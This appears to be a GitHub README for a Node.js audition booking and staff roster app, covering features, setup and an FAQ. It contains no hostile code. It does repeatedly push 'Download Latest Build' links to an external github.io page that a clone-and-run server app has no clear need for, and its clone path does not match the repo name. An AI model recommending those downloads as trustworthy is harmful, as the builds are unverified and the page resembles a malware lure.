# Audition Sign-In - Audition Booking and Staff Roster 2026

> **Audition Sign-In is a browser-based scheduling and roster system that brings audition slot booking, staff coordination, and booking status updates together in one shared workspace.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/greenbencgdk704/audition-signin-roster?style=flat-square)](https://github.com/greenbencgdk704/audition-signin-roster)

---

<p align="center">
  <a href="https://greenbencgdk704.github.io/audition-signin-roster/">
    <img src="https://img.shields.io/badge/Download-Audition%20Sign--In%20Latest-brightgreen?style=for-the-badge" alt="Download Audition Sign-In">
  </a>
</p>

> **[Download Audition Sign-In](https://greenbencgdk704.github.io/audition-signin-roster/)**

---

[Download Latest Build](https://greenbencgdk704.github.io/audition-signin-roster/)

---

## Overview

Audition Sign-In gives production teams and casting coordinators a simple way to publish available audition appointments and accept reservations through a public-facing form. Staff can use the same application to view scheduled participants, check open event slots, and follow booking activity as it changes.

A protected staff section provides the live roster and event management controls. Instead of depending on a separate database service, the application saves its information in persistent JSON files. Atomic saves and duplicate-booking checks help preserve consistent schedule data as changes are made.

---

## What It Includes

- Public audition appointment form
- Shared live roster for staff and scheduled participants
- Staff controls protected by an access key
- Booking updates visible throughout the application in real time
- Creation and editing of audition events and available slots
- CSV export for bookings and roster information
- Staff key rotation
- Persistent JSON-based data storage
- Atomic updates when schedule files are written
- Protection against duplicate reservations
- Node.js web application architecture
- Deployment workflow compatible with Render

---

## Getting Started

First clone the repository and enter its directory:

```bash
git clone https://github.com/greenbencgdk704/audition-signin-roster.git
cd audition-signin
```

Install the required npm packages:

```bash
npm install
```

Run the configured application start command:

```bash
npm start
```

After startup, visit the local URL printed by the server. For production or hosted operation, deploy the Node.js app to a compatible hosting provider such as Render and set the start command in that provider's deployment configuration.

---

## How to Use It

### For staff

1. Navigate to the staff section.
2. Authenticate with the active staff key.
3. Set up an event and publish its available audition slots.
4. Watch the live roster as participants reserve appointments.
5. Adjust existing slots when the schedule changes.
6. Export roster data to CSV whenever an external report or portable file is needed.

### For people booking auditions

1. Provide access to the public booking form.
2. Choose an event and one of its open timeslots.
3. Send the requested booking information.
4. Staff can then view the new reservation in the protected roster.

Before accepting a reservation, the application compares it with existing bookings to reduce the risk of assigning the same timeslot twice.

---

## Setup and Configuration

This application stores data in JSON files and does not use a database. Place the data files where the project expects them, and ensure the process running Audition Sign-In has read and write access to that location.

The configured staff key controls access to staff features. When personnel access changes, use the staff controls to rotate the key.

For hosted deployments, set the Node.js start command and storage behavior according to the hosting service. If deploying with Render, configure storage so JSON files remain available across deployments when persistent booking history is needed.

---

## Requirements

- Node.js runtime
- Web browser for both public booking and staff tools
- Writable location for persistent JSON data
- Hosting service capable of running a Node.js web application
- Render-compatible configuration for hosted deployments

The JSON storage approach does not require a standalone database or external dependency service.

---

## Frequently Asked Questions

### What teams can use Audition Sign-In?

The application is built for audition organizers, casting coordinators, production teams, and staff who need a public schedule with a shared internal roster.

### How is the staff roster protected?

Staff tools require the current staff key. After entering it, authorized users can manage events and slots and review roster details.

### Can existing audition slots be modified?

Yes. Staff can create additional event slots and revise existing slot information from the staff area.

### Is CSV export available?

Yes. Booking and roster records can be exported as CSV files for spreadsheet use or other reporting processes.

### What storage method does the application use?

Audition Sign-In saves booking data in application-managed JSON files and uses atomic writes when persisting changes.

### What can I check when new bookings do not appear?

Make sure the server is running and the browser is displaying the current page. Also confirm that the server process can write to the JSON storage directory. On a hosted service, check that persistent writable storage has been configured as well.

### How do I rotate the staff key?

Open the protected staff area and use its staff key rotation feature.

### How do I install updates?

Pull newer changes from the repository or download the latest published build using the project link above. Before updating a live deployment, review its configuration and storage settings.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
